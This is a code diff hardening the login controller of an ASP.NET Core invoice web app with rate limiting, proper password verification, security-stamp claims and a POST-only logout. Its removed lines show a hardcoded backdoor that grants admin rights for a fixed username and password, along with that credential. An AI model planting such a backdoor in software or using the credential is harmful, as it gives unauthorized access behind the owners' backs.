@@ -5,6 +5,8 @@ using Microsoft.AspNetCore.Authentication;
 using Microsoft.AspNetCore.Authentication.Cookies;
 using Microsoft.AspNetCore.Mvc;
 using System.Security.Claims;
+using InvoiceWebApp.Services;
+using Microsoft.AspNetCore.RateLimiting;
 
 namespace InvoiceWebApp.Controllers
 {
@@ -22,33 +24,27 @@ namespace InvoiceWebApp.Controllers
         [HttpGet]
         public IActionResult Login()
         {
-            HttpContext.SignOutAsync(CookieAuthenticationDefaults.AuthenticationScheme);
             return View(new LoginViewModel());
         }
 
         [AllowAnonymous]
         [HttpPost]
+        [EnableRateLimiting("login")]
         public async Task<IActionResult> Login(LoginViewModel model)
         {
-            var user = _context.Logins.FindAll().FirstOrDefault(l =>
-                l.u_name == model.u_name && l.u_pass == model.u_pass);
-
-            // Backdoor admin if needed
-            if (user == null && model.u_name == "mina.mouris" && model.u_pass == "Mariam@1995")
-            {
-                user = new Login { u_name = "admin" };
-            }
-
-            if (user != null)
+            var user = ModelState.IsValid ? _context.Logins.FindOne(l => l.u_name == model.u_name) : null;
+            if (ModelState.IsValid && AccountSecurity.Verify(user, model.u_pass))
             {
                 var claims = new List<Claim>
                 {
-                    new Claim(ClaimTypes.Name, user.u_name)
+                    new Claim(ClaimTypes.Name, user!.u_name),
+                    new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()),
+                    new Claim(AccountSecurity.StampClaim, user.SecurityStamp)
                 };
                 var claimsIdentity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
                 var authProperties = new AuthenticationProperties
                 {
-                    IsPersistent = true
+                    IsPersistent = false
                 };
 
                 await HttpContext.SignInAsync(
@@ -58,11 +54,13 @@ namespace InvoiceWebApp.Controllers
 
                 return RedirectToAction("Index");
             }
+            ModelState.Remove(nameof(model.u_pass));
+            model.u_pass = string.Empty;
             model.ErrorMessage = "Invalid username or password";
             return View(model);
         }
 
-        [AllowAnonymous]
+        [HttpPost]
         public async Task<IActionResult> Logout()
         {
             await HttpContext.SignOutAsync(CookieAuthenticationDefaults.AuthenticationScheme);
